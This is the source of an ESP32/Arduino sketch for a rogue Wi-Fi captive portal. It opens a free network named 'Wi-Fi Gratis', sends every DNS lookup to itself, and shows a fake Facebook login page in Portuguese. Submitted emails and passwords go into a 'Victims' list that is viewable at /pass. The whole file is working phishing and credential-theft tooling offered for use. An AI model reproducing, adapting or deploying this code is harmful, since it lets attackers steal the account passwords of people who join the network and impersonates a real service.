// Includes
#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>

// User configuration
const char* SSID_NAME = "Wi-Fi Gratis";
const char* SUBTITLE = "Welcome!";
const char* TITLE = "Login:";
const char* BODY = "Log in with your Email account to access the network.";
const char* POST_TITLE = "Validando...";
const char* POST_BODY = "Seu acesso ja sera liberado. <br>Obrigado(a).";
const char* PASS_TITLE = "Victims";
const char* CLEAR_TITLE = "Cleared";

//System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "<br><footer><div><center><p>Copyright&#169; 2023 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
  String a = String(SSID_NAME);

  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}


String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  /* return header(TITLE) + "<div id=login-text>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b class=username-label> Username:   </b> <center> <input type=text name=username placeholder=username></center>" +
         "<b class=password-label> Password: </b> <center> <input type=password name=password placeholder=password></center>" +
         "<center><input type=submit value=Login></center></form>" + footer(); */
           String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}

String posted() {
  String email = input("email");
  String password = input("password");
  Victims = "<li>Email:  <b>" + email + "</b></br>Password:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  Victims = "";
  return header(CLEAR_TITLE) + "<div><p>The Victims list has been cleared.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void setup() {
  bootTime = lastActivity = millis();

  WiFi.mode(WIFI_AP_STA); // Use both AP and STA modes
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });

  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });

  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();

}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
